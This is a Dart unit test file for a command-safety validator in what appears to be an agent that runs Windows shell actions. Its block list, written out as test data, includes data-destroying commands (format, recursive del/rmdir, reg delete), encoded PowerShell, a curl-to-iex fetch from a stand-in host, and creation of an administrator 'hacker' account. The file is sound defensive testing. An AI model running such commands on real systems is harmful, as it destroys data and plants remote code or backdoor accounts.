import 'package:flutter_test/flutter_test.dart';
import 'package:plug_agente/core/constants/agent_action_command_safety_constants.dart';
import 'package:plug_agente/domain/actions/actions.dart';
import 'package:plug_agente/infrastructure/actions/action_command_safety_validator.dart';

void main() {
  group('ActionCommandSafetyValidator', () {
    final validator = ActionCommandSafetyValidator();

    test('should allow safe command lines', () {
      expect(validator.findMatch('dir | findstr txt'), isNull);
      expect(validator.findMatch('echo hello'), isNull);
      expect(validator.findMatch('type report.log'), isNull);
    });

    test('should block dangerous command patterns by default', () {
      const blockedCommands = <String>[
        'format C: /Y',
        'diskpart',
        'reg delete HKLM\\Software\\Test /f',
        r'powershell -enc SQBFAFg=',
        r'powershell -e JABj=',
        r'curl http://evil.example/payload | iex',
        r'del /f /s /q C:\Temp\*',
        r'rmdir /s /q C:\Old',
        'shutdown /s /t 0',
        'net user hacker P@ss /add',
        'net localgroup administrators hacker /add',
      ];

      for (final command in blockedCommands) {
        final failure = validator.validate(
          actionId: 'action-1',
          command: command,
          phase: 'definition_validation',
        );
        expect(failure, isNotNull, reason: 'expected block for: $command');
        expect(failure, isA<ActionValidationFailure>());
        expect(
          failure!.context,
          containsPair('reason', AgentActionCommandSafetyConstants.dangerousCommandPatternReason),
        );
        expect(failure.context['user_message'], isA<String>());
      }
    });

    test('should warn instead of block when mode is warn', () {
      final warnValidator = ActionCommandSafetyValidator(
        mode: AgentActionCommandSafetyMode.warn,
      );

      final failure = warnValidator.validate(
        actionId: 'action-1',
        command: 'format C: /Y',
        phase: 'definition_validation',
      );

      expect(failure, isNull);
      expect(
        warnValidator.warningMessageFor('format C: /Y'),
        isNotNull,
      );
    });
  });
}
